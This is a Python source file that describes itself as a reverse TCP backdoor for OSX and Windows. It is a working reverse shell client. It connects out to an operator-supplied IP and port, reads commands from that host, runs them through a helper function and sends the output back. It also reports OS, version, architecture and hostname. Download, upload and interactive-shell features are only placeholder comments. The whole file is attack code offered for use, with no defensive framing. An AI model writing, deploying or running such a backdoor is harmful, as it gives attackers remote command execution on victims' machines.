import argparse
import socket
import os
import platform
import utils


"""
Reverse TCP backdoor works on OSX and Windows
"""

def main():
    args = init_argparse()
    port = args.port
    ip = args.ip

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        
        while True:
            cmd = s.recv(1024).decode('utf-8').rstrip('\n')

            if cmd.strip() == 'exit':
                s.sendall(b'Exitting...')
                break

            out = handle_cmd(cmd)

            if out:
                s.sendall(out.encode('utf-8'))
    

def handle_cmd(cmd):
    keyword = cmd.split(' ')[0]

    # change directories
    if keyword == 'cd':
        dir = cmd.split('cd')[1].strip()

        try:
            os.chdir(dir)
        except FileNotFoundError as e:
            return str(e) + '\n'

    # get system information
    if keyword == 'sys_info':
        return sys_info()

    # download a file

    # upload a file

    # execute the command as is

    # get an interactive shell

    # help
    else:
        return utils.execute_cmd(cmd)


def sys_info():
    info = ('OS: {os}'
            '\nVersion: {version}'
            '\nArchitecture: {arch}'
            '\nNetwork Name: {name}\n'
            ).format(os=platform.system(), 
            version=platform.version(), 
            arch=platform.machine(), 
            name=platform.node())

    return info


def init_argparse():
    parser = argparse.ArgumentParser(description="TCP reverse shell.")
    parser.add_argument("--port", "-p", type=int, required=True, help="The port to transmit on.")
    parser.add_argument("ip", type=str, help="The ip of the host to connect to.")
    return parser.parse_args()


if __name__ == '__main__':
    main()